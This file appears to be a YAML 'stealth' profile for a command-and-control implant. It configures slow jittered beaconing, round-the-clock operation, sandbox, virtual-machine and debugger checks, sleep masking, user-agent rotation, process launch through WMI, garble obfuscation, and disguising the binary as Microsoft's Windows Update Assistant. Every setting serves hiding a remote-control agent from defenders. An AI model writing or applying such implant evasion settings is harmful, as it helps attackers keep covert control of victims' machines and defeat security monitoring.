# Stealth profile — slow beacon, full evasion, 24/7 operation
# WARNING: working_hours_only=true means agent only beacons 08:00-18:00.
# Shell commands queued outside that window execute on the next beacon cycle.
# Recommended shell timeout: --timeout 600
name: stealth
sleep_interval: 300s
jitter_percent: 50
max_retries: 3
enable_sandbox_check: true
enable_vm_check: true
enable_debug_check: true
sleep_masking: true
user_agent_rotation: true
kill_date: ""
working_hours_only: false
working_hours_start: 8
working_hours_end: 18

# Level 1 evasion
exec_method: wmi            # spawn via wmic.exe LOLBin — process parent = WMI host
obfuscate: true             # requires garble: go install mvdan.cc/garble@latest
masquerade:
  enabled: true
  company: "Microsoft Corporation"
  product: "Windows Update"
  description: "Windows Update Assistant"
  original_filename: "wuauclt.exe"
  version: "10.0.19041.1866"
